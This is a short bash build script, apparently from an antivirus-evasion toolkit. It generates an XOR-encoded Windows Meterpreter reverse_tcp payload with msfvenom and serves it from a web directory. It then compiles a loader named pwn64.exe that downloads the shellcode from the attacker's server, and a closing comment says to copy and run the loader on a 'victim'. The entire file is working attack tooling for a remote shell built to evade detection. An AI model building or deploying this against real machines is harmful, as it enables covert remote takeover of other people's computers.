#!/bin/bash          
# example script for building executables with 64bit payload
. build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=443 -e x64/xor -b '\x00' -f raw --platform Windows > /var/www/html/sc.bin
# call make_avet, compile 
./make_avet -X -d sock 
$win64_compiler -o pwn64.exe avet.c  -lwsock32 -lWs2_32
# cleanup
echo "" > defs.h
# now copy pwn64.exe to victim and exec like: pwn http://yourserver/sc.bin
